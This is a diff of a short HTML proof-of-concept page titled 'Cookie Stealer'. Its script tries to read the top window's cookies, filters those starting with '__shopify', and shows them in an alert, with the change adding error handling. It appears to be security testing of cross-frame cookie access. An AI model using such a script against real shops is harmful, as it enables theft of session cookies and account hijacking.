@@ -3,21 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Stealer</title>
+    <title>Cookie Stealer1</title>
 </head>
 <body>
     <script>
         // Function to retrieve and display cookies from cdn.shopify.com
         function displayShopifyCookies() {
             // Access the top window's document to get cookies
-            const topWindow = window.top;
-            const shopifyCookies = topWindow.document.cookie;
+            try {
+                const topWindow = window.top;
+                const shopifyCookies = topWindow.document.cookie;
 
-            // Filter cookies to only include those from cdn.shopify.com
-            const shopifyCookieArray = shopifyCookies.split(';').filter(cookie => cookie.trim().startsWith('__shopify'));
-            const shopifyCookiesString = shopifyCookieArray.join('; ');
+                // Filter cookies to only include those from cdn.shopify.com
+                const shopifyCookieArray = shopifyCookies.split(';').filter(cookie => cookie.trim().startsWith('__shopify'));
+                const shopifyCookiesString = shopifyCookieArray.join('; ');
 
-            alert('Shopify Cookies: ' + shopifyCookiesString);
+                alert('Shopify Cookies: ' + shopifyCookiesString);
+            } catch (e) {
+                console.error('Error accessing cookies:', e);
+                alert('Error accessing cookies: ' + e.message);
+            }
         }
 
         // Call the function to display Shopify cookies
